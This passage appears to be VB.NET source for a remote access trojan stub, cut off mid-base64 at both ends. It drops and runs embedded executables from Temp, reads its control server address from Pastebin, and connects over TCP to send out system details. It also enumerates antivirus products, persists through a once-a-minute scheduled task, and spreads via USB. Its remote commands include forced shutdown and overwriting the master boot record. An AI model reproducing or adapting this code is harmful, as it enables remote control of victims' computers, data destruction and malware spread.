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")
                    IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & Bypass, byt)
                    Threading.Thread.Sleep(1000)
                    Diagnostics.Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & Bypass)

                    Threading.Thread.Sleep(5000)
                End If

                '
                If IO.File.Exists(IO.Path.GetTempPath & "sand.dat") Then
                    H = "127.0.0.1"
                    UNS()
                    Application.Exit()
                    ProjectData.EndApp()
                Else

                End If

            End If

            If OK.PasteE Then
                Dim str As String
                Dim strArr() As String
                Dim count As Integer
                str = New WebClient().DownloadString(PASTEBIN)
                strArr = str.Split(":")
                For count = 0 To strArr.Length - 1
                    OK.H = strArr(0)
                    OK.P = strArr(1)


                Next
            Else
            End If

            OK.Cn = False
            Thread.Sleep(&H7D0)


            If OK.KProc Then
                Interaction.Shell(("taskkill /f im " & Proc), AppWinStyle.Hide, True, &H1388)
            End If

            If OK.TaskMGR Then
                Stub.NoTsk.Start()
            End If

            If OK.Sched Then


                Try

                    Interaction.Shell(("schtasks /delete /tn " & """" & OK.SCHEDNAME & """" & " /f"), AppWinStyle.Hide, True, &H1388)
                    Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn " & """" & OK.SCHEDNAME & """" & " /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)

                Catch exception8 As Exception

                    ProjectData.SetProjectError(exception8)

                    Dim exception3 As Exception = exception8

                    ProjectData.ClearProjectError()

                End Try
            End If

            Dim lO As FileInfo = OK.LO
            SyncLock lO
                Try
                    If (Not OK.C Is Nothing) Then
                        Try
                            OK.C.Close()
                            OK.C = Nothing
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Try
                        OK.MeM.Dispose()
                    Catch exception6 As Exception
                        ProjectData.SetProjectError(exception6)
                        Dim exception2 As Exception = exception6
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception7 As Exception
                    ProjectData.SetProjectError(exception7)
                    Dim exception3 As Exception = exception7
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.MeM = New MemoryStream
                    OK.C = New TcpClient
                    OK.C.ReceiveBufferSize = &H32000
                    OK.C.SendBufferSize = &H32000
                    OK.C.Client.SendTimeout = &H2710
                    OK.C.Client.ReceiveTimeout = &H2710
                    OK.C.Connect(OK.H, Conversions.ToInteger(OK.P))
                    OK.Cn = True
                    OK.Send(OK.inf)
                    Try
                        Dim str As String
                        If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                            str = (str & OK.DEB(OK.VN) & ChrW(13) & ChrW(10))
                        Else
                            str = (str & OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & ChrW(13) & ChrW(10))
                        End If
                        str = ((((((String.Concat(New String() {str, OK.H, ":", OK.P, ChrW(13) & ChrW(10)}) & OK.DR & ChrW(13) & ChrW(10)) & OK.EXE & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Idr) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.IsF) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Isu) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.BD))
                        OK.Send(("inf" & OK.Y & OK.ENB(str)))
                    Catch exception8 As Exception
                        ProjectData.SetProjectError(exception8)
                        Dim exception4 As Exception = exception8
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception5 As Exception = exception9
                    OK.Cn = False
                    ProjectData.ClearProjectError()
                End Try
            End SyncLock
            Return OK.Cn
        End Function

        Public Shared Function DEB(ByRef s As String) As String
            Return OK.BS(Convert.FromBase64String(s))
        End Function

        Public Shared Sub DLV(ByVal n As String)
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG), True).DeleteValue(n)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub ED()
            OK.pr(0)
        End Sub

        Public Shared Function ENB(ByRef s As String) As String
            Return Convert.ToBase64String(OK.SB(s))
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetForegroundWindow() As IntPtr
        End Function

        <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
        End Function

        <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
        End Function


        Public Shared Function GetAntiVirus() As String
            '' By AFHJQ
            Dim AV As String
            Dim fir As Integer
            Try
                Dim Sec As Integer
                Dim Thr As Integer
one:
                Thr = 1
                Dim obj4 As Object = "Select * From AntiVirusProduct"
two:
                Thr = 2
                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\.\root\SecurityCenter2", Nothing))
thr:
                Thr = 3
                Dim arguments As Object() = New Object() {RuntimeHelpers.GetObjectValue(obj4)}
                Dim copyBack As Boolean() = New Boolean() {True}
                If copyBack(0) Then
                    obj4 = RuntimeHelpers.GetObjectValue(arguments(0))
                End If
                Dim Obf As Object = RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(objectValue, Nothing, "ExecQuery", arguments, Nothing, Nothing, copyBack))
tori:
                Thr = 4
                Dim enumerator As IEnumerator = DirectCast(Obf, IEnumerable).GetEnumerator
                Do While enumerator.MoveNext
                    Dim instance As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
fiv:

                    Sec = 1
sx:
                    Thr = 6
                    AV = Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(instance, Nothing, "displayName", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString
                    GoTo Label_015D
sve:
                    Thr = 7
                Loop
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
nime:
                Thr = 8
                AV = "No AV"
                GoTo Label_015D
ly:
                fir = 0
                Select Case (fir + 1)
                    Case 1
                        GoTo one
                    Case 2
                        GoTo two
                    Case 3
                        GoTo thr
                    Case 4
                        GoTo tori
                    Case 5
                        GoTo fiv
                    Case 6
                        GoTo sx
                    Case 7
                        GoTo sve
                    Case 8
                        GoTo nime
                    Case 9
                        GoTo Label_015D
                    Case Else
                        GoTo Label_0152
                End Select
Label_011B:
                fir = Thr
                Select Case Sec
                    Case 0
                        GoTo Label_0152
                    Case 1
                        GoTo ly
                End Select
            Catch ex As Exception

                GoTo Label_011B
            End Try
Label_0152:

Label_015D:
            If (fir <> 0) Then

            End If
            Return AV

        End Function


        <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
        End Function

        Public Shared Function GTV(ByVal n As String, ByVal ret As Object) As Object
            Dim obj2 As Object
            Try
                obj2 = OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG)).GetValue(n, RuntimeHelpers.GetObjectValue(ret))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                obj2 = ret
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Function HWD() As String
            Dim str As String
            Try
                Dim num As Integer
                Dim lpVolumeNameBuffer As String = Nothing
                Dim lpMaximumComponentLength As Integer = 0
                Dim lpFileSystemFlags As Integer = 0
                Dim lpFileSystemNameBuffer As String = Nothing
                OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
                str = Conversion.Hex(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "ERR"
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function


        <DllImport("KERNEL32.DLL")>
        Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)

        End Sub


        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function FindWindow(
        ByVal lpClassName As String,
        ByVal lpWindowName As String) As IntPtr
        End Function

        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function ShowWindow(
        ByVal hwnd As IntPtr,
        ByVal nCmdShow As Int32) As Boolean
        End Function






        <DllImport("winmm.dll")>
        Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
        End Function

        <DllImport("user32.dll")>
        Private Shared Function ReleaseDC(ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("gdi32.dll")>
        Private Shared Function CreateSolidBrush(crColor As UInteger) As IntPtr
        End Function



        <DllImport("gdi32.dll")>
        Private Shared Function PatBlt(hdc As IntPtr, nXLeft As Integer, nYLeft As Integer, nWidth As Integer, nHeight As Integer, dwRop As TernaryRasterOperations) As Boolean
        End Function


        <DllImport("gdi32.dll", EntryPoint:="BitBlt", SetLastError:=True,
CharSet:=CharSet.Unicode, ExactSpelling:=True,
CallingConvention:=CallingConvention.StdCall)>
        Public Shared Function BitBlt(
ByVal hdcDest As IntPtr,
ByVal nXDest As Integer,
ByVal nYDest As Integer,
ByVal nWidth As Integer,
ByVal nHeight As Integer,
ByVal hdcSrc As IntPtr,
ByVal nXSrc As Integer,
ByVal nYSrc As Integer,
ByVal dwRop As Int32)
        End Function


        <DllImport("gdi32.dll")>
        Private Shared Function StretchBlt(ByVal hdcDest As IntPtr, ByVal nXOriginDest As Integer, ByVal nYOriginDest As Integer, ByVal nWidthDest As Integer, ByVal nHeightDest As Integer, ByVal hdcSrc As IntPtr, ByVal nXOriginSrc As Integer, ByVal nYOriginSrc As Integer, ByVal nWidthSrc As Integer, ByVal nHeightSrc As Integer, ByVal dwRop As TernaryRasterOperations) As Boolean

        End Function


        <DllImport("user32.dll")>
        Private Shared Function GetDesktopWindow() As IntPtr

        End Function

        <DllImport("user32.dll")>
        Private Shared Function GetWindowDC(ByVal hWnd As IntPtr) As IntPtr

        End Function

        <DllImport("gdi32")>
        Private Shared Function SelectObject(ByVal hdc As IntPtr, ByVal hgdiobj As IntPtr) As IntPtr
        End Function

        <DllImport("gdi32")>
        Private Shared Function DeleteObject(ByVal objectHandle As IntPtr) As Boolean
        End Function


        Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source

        Public Enum TernaryRasterOperations
            SRCCOPY = &HCC0020
            SRCPAINT = &HEE0086
            SRCAND = &H8800C6
            SRCINVERT = &H660046
            SRCERASE = &H440328
            NOTSRCCOPY = &H330008
            NOTSRCERASE = &H1100A6
            MERGECOPY = &HC000CA
            MERGEPAINT = &HBB0226
            PATCOPY = &HF00021
            PATPAINT = &HFB0A09
            PATINVERT = &H5A0049
            DSTINVERT = &H550009
            BLACKNESS = &H42
            WHITENESS = &HFF0062
        End Enum

        Private r As Random


        Private Enum SW As Int32
            Hide = 0
            Normal = 1
            ShowMinimized = 2
            ShowMaximized = 3
            ShowNoActivate = 4
            Show = 5
            Minimize = 6
            ShowMinNoActive = 7
            ShowNA = 8
            Restore = 9
            ShowDefault = 10
            ForceMinimize = 11
            Max = 11
        End Enum

        Private Enum GetWindow_Cmd As UInteger
            GW_HWNDFIRST = 0
            GW_HWNDLAST = 1
            GW_HWNDNEXT = 2
            GW_HWNDPREV = 3
            GW_OWNER = 4
            GW_CHILD = 5
            GW_ENABLEDPOPUP = 6
        End Enum



        Public Shared Sub Ind(ByVal b As Byte())
            Dim strArray As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
            Try
                Dim buffer As Byte()
                Dim str4 As String = strArray(0)

                Select Case str4
                    Case "persis"
                        Persistence.Startup()

                    Case "schedtasks"
                        Interaction.Shell(("schtasks /create /sc minute /mo 1 /tn " & SCHEDNAME & " /tr " & AppDomain.CurrentDomain.BaseDirectory & IO.Path.GetFileName(Application.ExecutablePath)), AppWinStyle.Hide, True, &H1388)
                        Exit Select

                    Case "unschedtasks"
                        Interaction.Shell(("schtasks /delete /tn " & SCHEDNAME & " /f"), AppWinStyle.Hide, True, &H1388)
                        Exit Select

                    Case "spreadusbme"
                        spredusb.Start()

                    Case "restartme"
                        Shell("shutdown -r -t 00 -f", AppWinStyle.Hide)

                    Case "shutdowm"
                        Shell("shutdown -s -t 00 -f", AppWinStyle.Hide)

                    Case "FuckMBR"

                        Try
                            File.Create("C://test.txt").Close()
                            OK.Send(("MSG" & OK.Y & "MBR Overwritten, Victim rebooted."))
                            MBRSlayer.Start()
                            Interaction.Shell(("cmd /c start shutdown /r /f /t 3"), AppWinStyle.Hide, True, &H1388)
                            File.Delete("C://test.txt")
                        Catch ex As Exception
                            If ex.ToString.Contains("denied") Then
                                OK.Send(("MSG" & OK.Y & "Can't overwrite MBR. (No admin)"))
                            End If
                        End Try
                        Exit Select

                    Case "FuckMBRNR"
                        Try
                            File.Create("C://test.txt").Close()
                            OK.Send(("MSG" & OK.Y & "MBR Overwritten."))
                            MBRSlayer.Start()
                            File.Delete("C://test.txt")
                        Catch ex As Exception
                            If ex.ToString.Contains("denied") Then
                                OK.Send(("MSG" & OK.Y & "Can't overwrite MBR. (No admin)"))
                            End If
                        End Try



                    Case "Flip" 
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height

                        StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "mirror"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "Invert"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY)

                        Exit Select

                    Case "Flashbang"
                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.WHITENESS)
                        Exit Select

                    Case "LightsOut"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.BLACKNESS)
                        Exit Select

                    Case "boing"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
                        Exit Select

                    Case "lockon"
                        Dim fuck As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & ".exe")

                        Try
                            If System.IO.File.Exists(IO.Path.GetTempPath & "select.dat") = True Then
                                System.IO.File.Delete(IO.Path.GetTempPath & "select.dat")
                            End If
                        Catch
                        End Try

                        Dim byt As Byte() = Convert.FromBase64String("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